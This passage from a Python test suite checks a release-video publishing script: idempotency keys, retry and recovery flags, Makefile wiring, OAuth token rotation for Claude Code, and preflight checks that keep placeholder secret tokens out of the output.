            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/ci"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "ci-videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(
            {"PDS_STUB_CAPTURE": str(ci_capture), "GITHUB_ACTIONS": "true"}
        ),
        check=True,
    )

    assert pds_idempotency_key(local_capture) == (
        "pdd-release-video:v1.1.0:abc123def456:local"
    )
    assert pds_idempotency_key(ci_capture) == (
        "pdd-release-video:v1.1.0:abc123def456:github-actions"
    )


def test_release_video_falsey_ci_env_uses_local_idempotency_provenance(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")

    for falsey_value in ("false", "0", "no", "off"):
        capture = tmp_path / f"pds-capture-{falsey_value}.json"
        subprocess.run(
            [
                sys.executable,
                str(SCRIPT),
                "--repo",
                str(repo),
                "--tag",
                "v1.1.0",
                "--git-sha",
                "abc123def456",
                "--script-path",
                str(existing_script),
                "--pds-cli",
                str(
                    pds_stub(
                        tmp_path,
                        {
                            "ok": True,
                            "summary": {"youtubeUrl": f"https://youtu.be/{falsey_value}"},
                        },
                    )
                ),
                "--output-dir",
                str(tmp_path / f"videos-{falsey_value}"),
            ],
            cwd=repo,
            text=True,
            capture_output=True,
            env=release_video_env({"PDS_STUB_CAPTURE": str(capture), "CI": falsey_value}),
            check=True,
        )

        assert pds_idempotency_key(capture) == (
            "pdd-release-video:v1.1.0:abc123def456:local"
        )


def test_release_video_env_full_idempotency_key_overrides_default(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    env = release_video_env(
        {
            "PDS_STUB_CAPTURE": str(capture),
            "RELEASE_VIDEO_IDEMPOTENCY_KEY": "manual-release-video-key",
        }
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/env-key"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    assert pds_idempotency_key(capture) == "manual-release-video-key"


def test_release_video_attempt_id_adds_retry_suffix(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/retry"}},
                )
            ),
            "--idempotency-attempt-id",
            "20260620-001",
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    assert (
        pds_idempotency_key(capture)
        == "pdd-release-video:v1.1.0:abc123def456:local:retry-20260620-001"
    )


def test_release_video_env_attempt_id_adds_retry_suffix(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    env = release_video_env(
        {
            "PDS_STUB_CAPTURE": str(capture),
            "RELEASE_VIDEO_ATTEMPT_ID": "ops-retry",
        }
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/env-retry"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    assert (
        pds_idempotency_key(capture)
        == "pdd-release-video:v1.1.0:abc123def456:local:retry-ops-retry"
    )


def test_release_video_fails_when_full_key_and_attempt_id_are_both_supplied(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/conflict"}},
                )
            ),
            "--idempotency-key",
            "manual-release-video-key",
            "--idempotency-attempt-id",
            "ops-retry",
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=False,
    )

    assert result.returncode == 1
    assert (
        "Use either a full release-video idempotency key or an attempt id, not both."
        in result.stderr
    )
    assert not capture.exists()


def test_release_video_idempotency_conflict_fails_before_claude_generation(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--claude-cli",
            str(tmp_path / "missing-claude"),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/conflict"}},
                )
            ),
            "--idempotency-key",
            "manual-release-video-key",
            "--idempotency-attempt-id",
            "ops-retry",
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=False,
    )

    assert result.returncode == 1
    assert (
        "Use either a full release-video idempotency key or an attempt id, not both."
        in result.stderr
    )
    assert "Claude CLI" not in result.stderr
    assert not (repo / "claude_prompt.txt").exists()
    assert not capture.exists()


def test_release_video_cli_can_bootstrap_selected_project(tmp_path: Path):
    _result, capture = run_release_video_with_existing_script(
        tmp_path,
        extra_args=["--bootstrap-selected-project"],
    )

    assert "--bootstrap-selected-project" in pds_capture_argv(capture)


def test_release_video_env_can_bootstrap_selected_project(tmp_path: Path):
    _result, capture = run_release_video_with_existing_script(
        tmp_path,
        env_extra={"RELEASE_VIDEO_BOOTSTRAP_SELECTED_PROJECT": "1"},
    )

    assert "--bootstrap-selected-project" in pds_capture_argv(capture)


def test_release_video_cli_can_force_regenerate(tmp_path: Path):
    _result, capture = run_release_video_with_existing_script(
        tmp_path,
        extra_args=["--force-regenerate"],
    )

    assert "--force-regenerate" in pds_capture_argv(capture)


def test_release_video_env_can_force_regenerate(tmp_path: Path):
    _result, capture = run_release_video_with_existing_script(
        tmp_path,
        env_extra={"RELEASE_VIDEO_FORCE_REGENERATE": "1"},
    )

    assert "--force-regenerate" in pds_capture_argv(capture)


def test_release_video_cli_can_set_metadata_conflict_use_existing(tmp_path: Path):
    _result, capture = run_release_video_with_existing_script(
        tmp_path,
        extra_args=["--metadata-conflict", "use-existing"],
    )

    pds_call = pds_capture_argv(capture)
    assert pds_call[pds_call.index("--metadata-conflict") + 1] == "use-existing"


def test_release_video_env_can_set_metadata_conflict_replace_with_force(
    tmp_path: Path,
):
    _result, capture = run_release_video_with_existing_script(
        tmp_path,
        env_extra={
            "RELEASE_VIDEO_METADATA_CONFLICT": "replace",
            "RELEASE_VIDEO_FORCE_REGENERATE": "1",
        },
    )

    pds_call = pds_capture_argv(capture)
    assert pds_call[pds_call.index("--metadata-conflict") + 1] == "replace"
    assert "--force-regenerate" in pds_call


def test_release_video_metadata_conflict_replace_requires_force_regenerate(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/recovery"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
            "--metadata-conflict",
            "replace",
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    assert result.returncode == 1
    assert (
        "--metadata-conflict replace requires --force-regenerate"
        in result.stderr
    )
    assert not capture.exists()


def test_release_video_recovery_flags_default_to_disabled(tmp_path: Path):
    _result, capture = run_release_video_with_existing_script(tmp_path)

    pds_call = pds_capture_argv(capture)
    assert "--bootstrap-selected-project" not in pds_call
    assert "--force-regenerate" not in pds_call
    assert "--metadata-conflict" not in pds_call


def test_release_video_makefile_passes_idempotency_env_vars():
    makefile_text = (ROOT / "Makefile").read_text(encoding="utf8")

    assert "RELEASE_VIDEO_IDEMPOTENCY_KEY ?=" in makefile_text
    assert "RELEASE_VIDEO_IDEMPOTENCY_PROVENANCE ?=" in makefile_text
    assert "RELEASE_VIDEO_ATTEMPT_ID ?=" in makefile_text
    assert (
        'RELEASE_VIDEO_IDEMPOTENCY_KEY="$(RELEASE_VIDEO_IDEMPOTENCY_KEY)"'
        in makefile_text
    )
    assert (
        'RELEASE_VIDEO_IDEMPOTENCY_PROVENANCE='
        '"$(RELEASE_VIDEO_IDEMPOTENCY_PROVENANCE)"'
        in makefile_text
    )
    assert (
        'RELEASE_VIDEO_ATTEMPT_ID="$(RELEASE_VIDEO_ATTEMPT_ID)"'
        in makefile_text
    )


def test_release_video_makefile_passes_recovery_env_vars():
    makefile_text = (ROOT / "Makefile").read_text(encoding="utf8")

    assert "RELEASE_VIDEO_BOOTSTRAP_SELECTED_PROJECT ?= 0" in makefile_text
    assert "RELEASE_VIDEO_FORCE_REGENERATE ?= 0" in makefile_text
    assert "RELEASE_VIDEO_METADATA_CONFLICT ?=" in makefile_text
    assert (
        'RELEASE_VIDEO_BOOTSTRAP_SELECTED_PROJECT="$(RELEASE_VIDEO_BOOTSTRAP_SELECTED_PROJECT)"'
        in makefile_text
    )
    assert (
        'RELEASE_VIDEO_FORCE_REGENERATE="$(RELEASE_VIDEO_FORCE_REGENERATE)"'
        in makefile_text
    )
    assert (
        'RELEASE_VIDEO_METADATA_CONFLICT="$(RELEASE_VIDEO_METADATA_CONFLICT)"'
        in makefile_text
    )


def test_release_video_metadata_conflict_recovery_is_documented():
    doc_text = (
        ROOT / "docs" / "contributors" / "pdd-cli-release-process.md"
    ).read_text(encoding="utf8")

    assert "RELEASE_VIDEO_METADATA_CONFLICT=replace" in doc_text
    assert "RELEASE_VIDEO_FORCE_REGENERATE=1" in doc_text
    assert "--metadata-conflict replace --force-regenerate" in doc_text


def test_release_video_makefile_has_status_target():
    makefile_text = (ROOT / "Makefile").read_text(encoding="utf8")

    default = subprocess.run(
        ["make", "-n", "release-video-status", "RELEASE_TAG=v0.0.289"],
        cwd=ROOT,
        text=True,
        capture_output=True,
        check=True,
    )
    with_query = subprocess.run(
        [
            "make",
            "-n",
            "release-video-status",
            "RELEASE_TAG=v0.0.289",
            "RELEASE_VIDEO_STATUS_QUERY=1",
        ],
        cwd=ROOT,
        text=True,
        capture_output=True,
        check=True,
    )

    assert "RELEASE_VIDEO_STATUS_QUERY ?= 0" in makefile_text
    assert "release-video-status:" in makefile_text
    assert "--status" in makefile_text
    assert "--status-query" not in default.stdout
    assert "--status-query" in with_query.stdout
    assert 'RELEASE_TAG is required' in makefile_text


def test_release_video_can_select_existing_pds_project(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--claude-cli",
            str(claude_stub(tmp_path)),
            "--pds-cli",
            str(pds_stub(tmp_path, {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/existing"}})),
            "--project-id",
            "release-project",
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    pds_call = json.loads(capture.read_text(encoding="utf8"))["argv"]
    assert pds_call[:2] == ["--project", "release-project"]
    assert pds_call[2:4] == ["release-video", "create"]
    assert "--project-name" not in pds_call


def test_release_video_can_pass_custom_claude_tool_allowlist(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    env = release_video_env(
        {
            "PDS_STUB_CAPTURE": str(capture),
            "RELEASE_VIDEO_CLAUDE_TOOLS": "Read,Grep,Bash(git show *)",
        }
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--claude-cli",
            str(claude_stub(tmp_path)),
            "--pds-cli",
            str(pds_stub(tmp_path, {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/tools"}})),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    claude_argv = json.loads((repo / "claude_argv.json").read_text(encoding="utf8"))
    assert claude_argv[claude_argv.index("--allowedTools") + 1] == "Read,Grep,Bash(git show *)"


def test_release_video_can_reuse_existing_script_without_invoking_claude(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--script-path",
            str(existing_script),
            "--claude-cli",
            str(tmp_path / "missing-claude"),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/reused"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    assert f"using prewritten script from {existing_script}" in result.stdout
    assert "https://youtu.be/reused" in result.stdout
    assert not (repo / "claude_prompt.txt").exists()
    output_dir = tmp_path / "videos" / "v1.1.0"
    script_text = (output_dir / "release_video_script.md").read_text(encoding="utf8")
    assert "\n## Opening (0:00 - 0:30)" in script_text
    assert "\n## Details (0:30 - 1:00)" in script_text
    pds_call = json.loads(capture.read_text(encoding="utf8"))["argv"]
    assert pds_call[pds_call.index("--script") + 1] == str(
        output_dir / "release_video_script.md"
    )


def test_release_video_claude_quota_failure_is_script_generation_diagnostic(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})
    claude = claude_failure_stub(
        tmp_path,
        "You've hit your weekly limit; resets on Jun 12, 2026 at 9am UTC\n",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--claude-cli",
            str(claude),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/quota"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=False,
    )

    assert result.returncode == 1
    assert "Claude Code script generation failed before PDS publish" in result.stderr
    assert "PDS was not invoked" in result.stderr
    assert "quota/auth class 'credential-limit'" in result.stderr
    assert "RELEASE_VIDEO_SCRIPT_PATH" in result.stderr
    assert not capture.exists()


def test_release_video_claude_generation_prefers_oauth_over_inherited_api_key(
    tmp_path: Path,
    monkeypatch,
):
    release_video = load_release_video_module()
    prompt_template = tmp_path / "release_video_LLM.prompt"
    prompt_template.write_text("Context:\n{release_context}\n", encoding="utf8")
    captured: dict[str, object] = {}

    def fake_run(
        command,
        *,
        cwd: Path,
        input_text: str | None = None,
        timeout: float | None = None,
        env: dict[str, str] | None = None,
        check: bool = True,
    ):
        captured["command"] = command
        captured["input_text"] = input_text
        captured["env"] = env
        return subprocess.CompletedProcess(
            command,
            0,
            stdout=reusable_script_text(),
            stderr="",
        )

    monkeypatch.setenv("ANTHROPIC_API_KEY", "stale-depleted-api-key")
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "stale-auth-token")
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "oauth-token")
    monkeypatch.delenv("PDD_KEEP_ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setattr(release_video, "ensure_command_exists", lambda *_args, **_kwargs: None)
    monkeypatch.setattr(release_video, "run", fake_run)

    script = release_video.generate_script_with_claude(
        context="# PDD release context",
        claude_cli="claude",
        claude_model="claude-opus-4-8",
        claude_tools="",
        prompt_template=prompt_template,
        timeout=60,
        cwd=tmp_path,
    )

    claude_env = captured["env"]
    assert isinstance(claude_env, dict)
    assert "ANTHROPIC_API_KEY" not in claude_env
    assert "ANTHROPIC_AUTH_TOKEN" not in claude_env
    assert claude_env["CLAUDE_CODE_OAUTH_TOKEN"] == "oauth-token"
    assert os.environ["ANTHROPIC_API_KEY"] == "stale-depleted-api-key"
    assert os.environ["ANTHROPIC_AUTH_TOKEN"] == "stale-auth-token"
    assert "--model" in captured["command"]
    assert "PDD release context" in captured["input_text"]
    assert "\nNARRATOR:\n" in script


def test_release_video_claude_generation_rotates_oauth_token_slots(
    tmp_path: Path,
    monkeypatch,
    capsys,
):
    release_video = load_release_video_module()
    prompt_template = tmp_path / "release_video_LLM.prompt"
    prompt_template.write_text("Context:\n{release_context}\n", encoding="utf8")
    attempted_tokens: list[str | None] = []

    def fake_run(
        command,
        *,
        cwd: Path,
        input_text: str | None = None,
        timeout: float | None = None,
        env: dict[str, str] | None = None,
        check: bool = True,
    ):
        token = env.get("CLAUDE_CODE_OAUTH_TOKEN") if env else None
        attempted_tokens.append(token)
        assert env is not None
        assert "ANTHROPIC_API_KEY" not in env
        if token == "limited-token":
            return subprocess.CompletedProcess(
                command,
                1,
                stdout="You've hit your weekly limit; resets tomorrow.",
                stderr="",
            )
        return subprocess.CompletedProcess(
            command,
            0,
            stdout=reusable_script_text(),
            stderr="",
        )

    monkeypatch.setenv("ANTHROPIC_API_KEY", "stale-depleted-api-key")
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN_1", "limited-token")
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN_2", "fresh-token")
    monkeypatch.delenv("CLAUDE_CODE_OAUTH_TOKEN_3", raising=False)
    monkeypatch.delenv("CLAUDE_CODE_OAUTH_TOKEN", raising=False)
    monkeypatch.setattr(release_video, "ensure_command_exists", lambda *_args, **_kwargs: None)
    monkeypatch.setattr(release_video, "run", fake_run)

    script = release_video.generate_script_with_claude(
        context="# PDD release context",
        claude_cli="claude",
        claude_model="claude-opus-4-8",
        claude_tools="",
        prompt_template=prompt_template,
        timeout=60,
        cwd=tmp_path,
    )

    assert attempted_tokens == ["limited-token", "fresh-token"]
    assert "\nNARRATOR:\n" in script
    assert "CLAUDE_CODE_OAUTH_TOKEN_1 failed" in capsys.readouterr().err


def test_release_video_env_oauth_strip_does_not_import_pdd(monkeypatch):
    release_video = load_release_video_module()
    env = {
        "ANTHROPIC_API_KEY": "stale-depleted-api-key",
        "ANTHROPIC_AUTH_TOKEN": "stale-auth-token",
        "CLAUDE_CODE_OAUTH_TOKEN": "oauth-token",
    }
    real_import = builtins.__import__

    def guarded_import(name, *args, **kwargs):
        if name == "pdd" or name.startswith("pdd."):
            raise AssertionError(f"unexpected pdd import: {name}")
        return real_import(name, *args, **kwargs)

    with monkeypatch.context() as guard:
        guard.setattr(builtins, "__import__", guarded_import)
        assert release_video.strip_anthropic_creds_for_claude_subprocess(env) is True

    assert "ANTHROPIC_API_KEY" not in env
    assert "ANTHROPIC_AUTH_TOKEN" not in env
    assert env["CLAUDE_CODE_OAUTH_TOKEN"] == "oauth-token"


def test_release_video_env_oauth_strip_recognizes_token_slots(monkeypatch):
    release_video = load_release_video_module()
    env = {
        "ANTHROPIC_API_KEY": "stale-depleted-api-key",
        "CLAUDE_CODE_OAUTH_TOKEN_2": "oauth-token",
    }

    assert release_video.strip_anthropic_creds_for_claude_subprocess(env) is True

    assert "ANTHROPIC_API_KEY" not in env
    assert env["CLAUDE_CODE_OAUTH_TOKEN_2"] == "oauth-token"


def test_release_video_strip_missing_optional_pdd_dependency_is_nonfatal(monkeypatch):
    release_video = load_release_video_module()
    env = {"ANTHROPIC_API_KEY": "stale-depleted-api-key"}
    real_import = builtins.__import__

    def missing_yaml_import(name, *args, **kwargs):
        if name == "pdd.agentic_common":
            raise ModuleNotFoundError("No module named 'yaml'", name="yaml")
        return real_import(name, *args, **kwargs)

    with monkeypatch.context() as guard:
        guard.setattr(builtins, "__import__", missing_yaml_import)
        assert release_video.strip_anthropic_creds_for_claude_subprocess(env) is False

    assert env["ANTHROPIC_API_KEY"] == "stale-depleted-api-key"


def test_release_video_claude_quota_auth_classifier():
    release_video = load_release_video_module()

    assert (
        release_video.classify_claude_quota_auth_failure(
            "You've hit your weekly limit; resets tomorrow."
        )
        == "credential-limit"
    )
    assert (
        release_video.classify_claude_quota_auth_failure("please run /login")
        == "oauth/login"
    )
    assert release_video.classify_claude_quota_auth_failure("401 unauthorized") == "auth"
    assert release_video.classify_claude_quota_auth_failure("temporary network error") is None


def test_release_video_fails_for_missing_prompt_template(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    missing_prompt = tmp_path / "missing_release_video_LLM.prompt"
    env = release_video_env(
        {
            "PDS_STUB_CAPTURE": str(tmp_path / "pds-capture.json"),
            "RELEASE_VIDEO_PROMPT_TEMPLATE": str(missing_prompt),
        }
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--claude-cli",
            str(claude_stub(tmp_path)),
            "--pds-cli",
            str(pds_stub(tmp_path, {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/prompt"}})),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=False,
    )

    assert result.returncode == 1
    assert f"Release-video prompt template not found: {missing_prompt}" in result.stderr
    assert not (repo / "claude_prompt.txt").exists()


def test_release_video_preflight_warns_for_project_scoped_profile(tmp_path: Path):
    config_home = tmp_path / "config"
    pds_config_dir = config_home / "pds"
    pds_config_dir.mkdir(parents=True)
    (pds_config_dir / "config.json").write_text(
        json.dumps(
            {
                "currentProfile": "v18finish",
                "profiles": {
                    "v18finish": {
                        "apiUrl": "https://video.promptdriven.ai",
                        "projectId": "pdd-release-v0-0-260",
                        "token": "local-secret-token",
                    }
                },
            }
        ),
        encoding="utf8",
    )
    env = release_video_env({"XDG_CONFIG_HOME": str(config_home)})
    env.pop("PDS_TOKEN", None)
    env.pop("PDS_PROFILE", None)
    env.pop("RELEASE_VIDEO_PROJECT_ID", None)

    result = subprocess.run(
        [sys.executable, str(SCRIPT), "--preflight"],
        cwd=tmp_path,
        text=True,
        capture_output=True,
        env=env,
        check=False,
    )

    assert result.returncode == 0
    assert "release-video preflight warning" in result.stderr
    assert "v18finish" in result.stderr
    assert "pdd-release-v0-0-260" in result.stderr
    assert "PDS agent token is not allowed for this project" in result.stderr
    assert "local-secret-token" not in result.stdout + result.stderr


def test_release_video_preflight_allows_env_token_without_printing_it(tmp_path: Path):
    config_home = tmp_path / "config"
    pds_config_dir = config_home / "pds"
    pds_config_dir.mkdir(parents=True)
    (pds_config_dir / "config.json").write_text(
        json.dumps(
            {
                "currentProfile": "v18finish",
                "profiles": {
                    "v18finish": {
                        "projectId": "pdd-release-v0-0-260",
                        "token": "local-secret-token",
                    }
                },
            }
        ),
        encoding="utf8",
    )
    env = {
        **release_video_env(),
        "XDG_CONFIG_HOME": str(config_home),
        "PDS_TOKEN": "env-secret-token",
    }
    env.pop("PDS_PROFILE", None)
    env.pop("RELEASE_VIDEO_PROJECT_ID", None)

    result = subprocess.run(
        [sys.executable, str(SCRIPT), "--preflight"],
        cwd=tmp_path,
        text=True,
        capture_output=True,
        env=env,
        check=False,
    )

    assert result.returncode == 0
    assert "PDS_TOKEN is set" in result.stdout
    assert "local preflight cannot verify token scopes or project access" in result.stdout
    assert "PDS server preflight" in result.stdout
    assert "continue accessing it afterward" in result.stdout
    assert "release-video preflight warning" not in result.stderr
    assert "env-secret-token" not in result.stdout + result.stderr
    assert "local-secret-token" not in result.stdout + result.stderr


def test_release_video_preflight_with_env_token_and_project_reports_fixed_project(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    env = release_video_env({"PDS_TOKEN": "env-secret-token"})

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--preflight",
            "--project-id",
            "fixed-project-123",
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    assert "using explicit PDS project fixed-project-123" in result.stdout
    assert "PDS_TOKEN is set for explicit PDS project fixed-project-123" in result.stdout
    assert "access to that fixed project" in result.stdout
    assert "Normal create-mode creates a new per-release project" not in result.stdout
    assert "env-secret-token" not in result.stdout + result.stderr


def test_release_video_publish_requires_youtube_url(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--claude-cli",
            str(claude_stub(tmp_path)),
            "--pds-cli",
            str(pds_stub(tmp_path, {"ok": True, "summary": {}})),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=False,
    )

    assert result.returncode == 1
    assert "did not return a YouTube URL" in result.stderr


def test_release_video_request_hash_mismatch_reports_idempotency_hint(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stderr='{"error":"request_hash_mismatch"}\n',
                    exit_code=1,
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    assert result.returncode == 1
    assert "request_hash_mismatch" in result.stderr
    assert "same idempotency key was reused with a different request body" in result.stderr


def test_release_video_persists_structured_pds_run_handle_sidecar(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    output_dir = tmp_path / "videos"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    structured_run = {
        "runId": "agent_run_json123",
        "projectId": "pdd-v1-1-0-release",
        "status": "running",
        "attemptId": "attempt-json123",
    }

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stderr=json.dumps(structured_run) + "\n",
                    exit_code=1,
                )
            ),
            "--output-dir",
            str(output_dir),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    assert result.returncode == 1
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    assert sidecar.exists()
    persisted = json.loads(sidecar.read_text(encoding="utf8"))
    assert persisted["runId"] == "agent_run_json123"
    assert persisted["projectId"] == "pdd-v1-1-0-release"
    assert persisted["status"] == "running"
    assert persisted["attemptId"] == "attempt-json123"
    assert (
        "release-video status --run-id agent_run_json123 --json"
        in persisted["recoverCommand"]
    )
    assert str(sidecar) in result.stderr


def test_release_video_persists_explicit_project_when_pds_run_lacks_project_id(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    output_dir = tmp_path / "videos"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--project-id",
            "fixed-release-project",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
